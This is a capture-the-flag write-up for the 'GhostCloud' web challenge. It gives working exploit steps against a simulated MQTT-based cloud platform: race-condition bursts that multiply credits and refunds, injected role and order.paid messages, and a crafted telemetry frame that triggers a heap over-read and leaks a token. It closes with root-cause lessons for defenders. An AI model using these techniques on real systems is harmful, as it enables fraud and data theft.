---
title: "Qiangwang 2026 — Ghost in the Queue (GhostCloud)"
date: "2026-10-31"
tags: ["qiangwang-2026", "web", "mqtt", "race-condition"]
excerpt: "GhostCloud is a simulated cloud-ops platform (API gateway, orders, wallet, fulfillment, job scheduler, loyalty, reconciliation, automation relay, audit, telemetry) where the core technique was message-bus trust-boundary…"
---

> **Qiangwang Mimic Defense 2026 Quals · Web · medium · 434 pts**

## Summary

GhostCloud is a simulated cloud-ops platform (API gateway, orders, wallet, fulfillment, job scheduler, loyalty, reconciliation, automation relay, audit, telemetry) where the core technique was message-bus trust-boundary confusion — backend services trusted fields and events published directly on a tenant's own MQTT namespace that only the HTTP gateway was supposed to produce — combined with TOCTOU races on "one-time" operations to assemble six key shares and unlock a vault.

## Solution

### Step 1: Recon — entry points and hints

You are tenant **alice** (normal user). A `vault` holds the single flag and needs **6 key shares** (`k1`–`k6`) scattered across the services.

**Entry points**
- HTTP API — `http://HOST:8080`, `Authorization: Bearer alice-token-7f3d9c`
- MQTT broker — `HOST:11883` (exposed over TLS in the lab), `alice` / `alice-mqtt-s3cret`
  - Tenant namespace `tenant/alice/#` (read+write), read-only `public/#`

**The three hints (all are used):**
1. *"Who wipes the one-time boundary, and when?"* → **TOCTOU races** (topup credit, refund).
2. *"The gateway only checks the address on the envelope."* → **trust-the-message / confused-deputy** (role injection into the job scheduler; the automation relay forwarding into internal topics; the fulfillment service trusting `order.paid` events).
3. *"The reconciliation service doesn't lie."* → an **integrity alert** leaks a key when the ledger is inconsistent.

Tooling: `paho-mqtt` (TLS, `CERT_NONE`) + `requests`/`urllib`.

### Step 2: Fund the wallet via a topup race (Hint 1)

The flag items cost money (crown 600, 2×gold-plate 300, badge 60), but the account starts with only ~100. `POST /api/topup` issues a **one-time** demo credit claim; the wallet credits it when it sees `topup.requested{claim_token}` on `tenant/alice/topup/events`. The "one credit per tenant" flag is set *after* crediting → **race it**.

Publish ~80 `topup.requested` with the same claim token in a tight burst:

```python
for i in range(80):
    c.publish("tenant/alice/topup/events",
        json.dumps({"type":"topup.requested","user":"alice",
                    "claim_token":CLAIM,"topup_id":uuid4().hex}), 0)
```

Balance: 90 → **8090**.

### Step 3: k1 — admin job via role injection (Hint 2)

`job_types.get_key1` is role **admin**. The API `POST /api/jobs` returns a valid `approval_id`, and the **job scheduler consumes `tenant/alice/jobs/submit` and trusts the `role` field in the message** (normally the gateway sets it). Publish directly with `role:admin`:

```python
ap = POST /api/jobs {"type":"echo","payload":{}}  -> approval_id
publish tenant/alice/jobs/submit {"type":"get_key1","role":"admin",
        "user":"alice","approval_id":ap,"job_id":uuid4(),"payload":{}}
# tenant/alice/jobs/results -> "key1-9f27c4a1d3e8"
```

**k1 = `key1-9f27c4a1d3e8`**

### Step 4: k3 — loyalty GOLD

Two paid orders of unit price ≥150 promote the tenant to GOLD; the reward is delivered to `tenant/alice/alerts`.

```
POST /api/orders {"item":"gold-plate"}  (x2)
alerts -> {"type":"loyalty.reward","key":"key3-77aa02d4f1c6"}
```

**k3 = `key3-77aa02d4f1c6`**

### Step 5: k4 — key-item shipment

Buying a "key item" ships it with a key in `/api/shipments`.

```
POST /api/orders {"item":"key4-crown"}   (600)
/api/shipments -> {"item":"key4-crown","key":"key4-c931e58b02ad",...}
```

**k4 = `key4-c931e58b02ad`**

### Step 6: k6 — refund race → reconciliation (Hints 1 + 3)

Cancelling a paid order refunds it. The "already cancelled" guard is racy — fire ~25 concurrent cancels on one paid order and it is **refunded twice**. Reconciliation ("doesn't lie") detects the imbalance and emits an integrity alert carrying the key.

```
25x concurrent: POST /api/orders/<paid_order_id>/cancel
alerts -> {"type":"integrity.alert",
           "message":"ledger imbalance: order ... refunded 2 times",
           "key":"key6-8831bb55e04f"}
```

**k6 = `key6-8831bb55e04f`**

### Step 7: k5 — telemetry heap over-read + diag dump (Hint 2)

The automation relay only allows `target: internal/audit/*`, but `internal/audit/ingest` **re-forwards the inner `body` to any `forward` topic** (confused deputy) — so we can reach `internal/telemetry/ingest`.

The native C telemetry agent (v2.3) parses frames `[0x54 0x4D][ver][n_records][tag][len][value]…`. Tag `0x21` (annotation) is **echoed back in the ack**, and the echo copies `len-2` bytes from the record buffer — a **Heartbleed-style over-read**. Declaring a large `len` leaks the loaded config, including the boot session token:

```python
relay("544d010121fe5859", reply_to="public/telemetry/leak")  # 0x21, len=0xFE, "XY"
# ack echo contains: ...CFG<33 chars>...  -> token = last 32 chars
```

Tag `0x30` is a diagnostic config dump gated by that 32-hex boot token. Send it with `reply_to=public/telemetry/status` (where the agent publishes the ack):

```python
tok = "1495739b1d47d46eeb48f51c5209c812"   # last 32 of leaked CFG field
relay((b"\x54\x4d\x01\x01\x30\x20"+tok.encode()).hex(), reply_to="public/telemetry/status")
# public/telemetry/status -> {"type":"diag",...,"escrow":{"key5":"key5-20df77ac19b3"}}
```

Gotcha: the dump is published to the frame's `reply_to`; use a readable `public/telemetry/*` topic and a persistent subscriber (it is briefly overwritten by the periodic status).

**k5 = `key5-20df77ac19b3`**

### Step 8: k2 — restricted item via event forgery (Hint 2) — the hard one

`key2-badge` is `restricted: true` ("admin role required"). Ordering it returns `cancelled` and the order never emits `order.paid`, so no shipment. Role override in the body/headers doesn't work, and `internal/shipping/authorize` only ships `ops_catalog` items (`ops-toolkit`).

**Key observation:** a restricted order is still **created and charged** (`paid:60`) — the *order record exists* — it is only the `order.paid` event that the gateway suppresses. The **fulfillment service subscribes to `tenant/alice/orders/events` and ships any existing order on `order.paid`, without re-checking the restriction** (the restriction lived only at order creation — "the gateway only checks the envelope").

So: place a real `key2-badge` order to mint a genuine `order_id`, then inject the `order.paid` the gateway refused to send:

```python
oid = POST /api/orders {"item":"key2-badge"} -> order_id   # status cancelled, record persists
publish tenant/alice/orders/events \
    {"order_id":oid,"user":"alice","item":"key2-badge","price":60,"type":"order.paid"}
# /api/shipments -> {"item":"key2-badge","key":"key2-5be810cc9742","order_id":oid}
```

(Injecting `order.paid` with a *fake* order_id does nothing — the fulfillment service requires a real order record. That was the missing detail.)

**k2 = `key2-5be810cc9742`**

### Step 9: Submit the vault

```
POST /api/vault/submit {"key":"key2-5be810cc9742"}
-> {"complete":true,"flag":"flag{[REDACTED]}",...}
```

### Root causes / lessons

- **TOCTOU** on "one-time" operations (topup claim, order cancel): the guard is set after the side effect, so concurrent requests multiply the effect.
- **Message-bus trust-boundary confusion**: backend workers (job scheduler, fulfillment) trust fields (`role`) and events (`order.paid`) on the tenant topic that only the HTTP gateway is supposed to produce. A tenant with write access to its own namespace bypasses all gateway-side checks.
- **Confused-deputy relay**: an "audit-only" relay re-forwards an attacker-controlled `forward` field into arbitrary internal topics.
- **Memory-unsafe native parser**: the telemetry annotation echo copies `len` bytes without validating against the actual value length (heap over-read).
- **Authorization enforced at the wrong layer**: `restricted` is checked only at order creation, not at fulfillment.
